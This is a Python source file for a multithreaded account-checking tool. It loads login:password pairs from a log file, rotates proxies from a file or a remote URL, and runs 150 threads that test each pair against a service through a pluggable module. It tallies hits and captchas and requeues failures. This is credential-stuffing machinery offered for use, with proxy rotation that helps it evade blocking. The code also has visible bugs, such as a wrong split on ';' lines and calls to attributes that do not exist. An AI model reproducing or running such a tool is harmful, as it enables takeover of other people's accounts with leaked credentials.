import importlib

import requests
import threading
import random
import time
from queue import Queue

class Core(object):
    def __init__(self, modulename):
        self.threadList = []
        self.modulename = modulename
        self.projectName = ""
        self.projectFullName = ""
        self.description = ""
        self.lines = Queue()
        self.good = 0
        self.bad = 0
        self.error = 0
        self.projerror = 0
        self.projid = 0
        self.proxylink = ""
        self.prlines = []
        self.proxytype = "https"
        self.basename = "log.txt"
        self.proxyname = "proxy.txt"
        self.captcha = 0
        self.running = True
        self.timeout = (15, 15)
        self.thread_count = 150
        self.lock = threading.Lock()
    def mainPoint(self):
        try :
            with open(self.basename, "r") as tags:
                for line in tags:
                    self.lines.put(line.strip())
                print('Count of accounts : ' + str(self.lines.qsize()))
            if "http" in self.proxylink:
                ptt = threading.Thread(target=self.updateProxyLink)
                ptt.daemon = True
                ptt.start()
                time.sleep(5)
                print("Proxy from url")
            else:
                print("Proxy from file")
                with open(self.proxyname, "r") as tags:
                    for line in tags:
                        self.prlines.append(line.strip())
                    print('Count of proxies : ' + str(len(self.prlines)))
            for x in range(int(self.thread_count)):
                th = BruteThread(self)
                th.daemon = True
                th.start()
                self.threadList.append(th)
            print("Succesfully created " + str(len(self.threadList)) + " threads.")
        except Exception as e:
            print("Error in core " + str(e))

    def updateProxyLink(self):
        print("PROX")
        while self.core.running:
            r = requests.get(self.proxylink, verify=False)
            self.prlines.clear()
            for line in r.text.split('\r\n'):
                self.prlines.append(line)
            time.sleep(60)
    def stop(self):
        self.running = False


class BruteThread(threading.Thread):
    def __init__(self, core):
        threading.Thread.__init__(self)
        self.core = core
    def run(self):
        mod = importlib.import_module('mechanic.' + self.core.modulename).Brute()
        while self.core.running:
            if (self.core.lines.empty()):
                self.stop()
                break
            trl = self.core.lines.get()
            try:
                
                #Trash
                self.core.projectName = mod.projectName
                self.core.projectFullName = mod.projectFullName
                self.core.description = mod.description
                #end Trash

                result = ""
                login = ""
                passw = ""
                if ":" in trl:
                    login = trl.split(':')[0]
                    passw = trl.split(':')[1]
                    result = mod.check(login, passw, self.core.proxytype, self.getproxy(), self.core.timeout)
                if ";" in trl:
                    login = trl.split(':')[0]
                    passw = trl.split(':')[1]
                    result = mod.check(login, passw, self.core.proxytype, self.getproxy(),
                                       self.core.timeout)
                if result == "good":
                    self.core.good += 1

                elif result == "bad":
                    self.core.bad += 1
                elif result == "error":
                    self.core.error += 1
                    self.core.lines.put(login + ":" + passw)
                elif result == "projerror":
                    self.core.projerror += 1
                elif result == "captcha":
                    self.core.captcha += 1
                    self.core.lines.put(login + ":" + passw)
                time.sleep(0.2)
            except Exception as e:
                print (e)
                self.core.error += 1
                self.core.lines.put(login + ":" + passw)
            finally:
                self.core.lines.task_done()
        self.exit_thread()

    def getproxy(self):
        return str(random.choice(self.core.prlines))
    def exit_thread(self):
        self.core.lock.acquire()
        self.core.thread_count -= 1
        self.core.lock.release()
